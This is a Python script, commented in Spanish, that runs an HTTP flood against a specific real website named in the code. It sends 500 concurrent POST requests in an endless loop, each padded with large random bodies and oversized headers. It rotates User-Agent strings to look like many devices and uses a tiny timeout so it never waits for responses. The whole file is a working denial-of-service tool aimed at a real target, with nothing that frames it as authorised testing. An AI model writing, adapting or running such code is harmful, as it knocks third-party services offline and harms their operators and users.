import aiohttp
import asyncio
import random

# URL de la página objetivo
url = 'https://www.saludsasales.com'

# Lista de diferentes User-Agents para simular múltiples dispositivos/navegadores
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
]

# Lista de headers personalizados adicionales para hacer las solicitudes más pesadas
custom_headers = [
    {'X-API-KEY': 'ABC123' * 50, 'X-Auth-Token': 'XYZ456' * 50},
    {'X-Session-ID': 'session123' * 50, 'X-Tracking-ID': 'track789' * 50},
    {'X-Device-ID': 'device555' * 50, 'X-User-Session': 'userSession999' * 50},
    {'X-Client-Version': 'version1.0.0' * 50, 'X-App-Token': 'appToken987' * 50},
]

# Función para hacer una solicitud POST con un cuerpo dinámico y headers pesados
async def hacer_solicitud(session):
    # Datos dinámicos en el cuerpo de la solicitud
    data = {
        "param1": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5000)),
        "param2": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5000)),
        "param3": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5000)),
        "param4": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5000)),
        "param5": ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=5000)),
    }
    
    # Seleccionar headers y User-Agent aleatorios para cada solicitud
    headers = {
        'User-Agent': random.choice(user_agents),
        'Content-Type': 'application/x-www-form-urlencoded',
        **random.choice(custom_headers)  # Combinar headers aleatorios adicionales
    }

    try:
        # Se realiza una solicitud POST con datos grandes y headers personalizados
        async with session.post(url, data=data, headers=headers, timeout=0.01) as response:
            # Procesar la respuesta si es necesario
            return response.status == 200  # Considera exitosa la solicitud si el código de estado es 200
    except asyncio.TimeoutError:
        return False  # Solicitud fallida por timeout
    except Exception as e:
        print(f"Error al hacer la solicitud: {e}")
        return False

# Función para manejar múltiples solicitudes simultáneamente sin detenerse
async def enviar_solicitudes_concurrentes(num_solicitudes):
    count = 0
    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [hacer_solicitud(session) for _ in range(num_solicitudes)]
            for result in await asyncio.gather(*tasks):
                if result:
                    count += 1
                    if count % 1000 == 0:
                        print(f"{count} solicitudes exitosas!")

# Ejecución del bucle principal en un while True para enviar la mayor cantidad de solicitudes posibles
if __name__ == "__main__":
    num_solicitudes_concurrentes = 500  # Ajusta este número según la capacidad de tu sistema
    asyncio.run(enviar_solicitudes_concurrentes(num_solicitudes_concurrentes))
